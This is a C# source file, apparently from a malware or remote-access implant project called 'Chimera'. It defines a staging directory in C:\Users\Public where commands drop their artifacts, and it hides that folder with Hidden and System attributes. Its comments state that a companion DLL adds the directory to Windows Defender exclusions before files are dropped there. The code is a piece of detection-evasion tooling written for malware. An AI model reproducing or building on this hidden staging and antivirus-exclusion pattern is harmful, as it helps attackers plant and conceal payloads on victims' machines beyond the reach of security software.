using System;
using System.IO;

namespace Chimera
{
    // Central staging directory used by all commands that write artifacts to disk.
    // C:\Users\Public always exists on every Windows machine — no Chrome required.
    // The DLL adds this directory to Defender exclusions before dropping files here.
    public static class Staging
    {
        public const string Dir = @"C:\Users\Public";

        public static void EnsureDir()
        {
            try
            {
                if (!Directory.Exists(Dir))
                {
                    Directory.CreateDirectory(Dir);
                    // Hide it
                    File.SetAttributes(Dir,
                        File.GetAttributes(Dir) | FileAttributes.Hidden | FileAttributes.System);
                }
            }
            catch { /* best-effort */ }
        }
    }
}
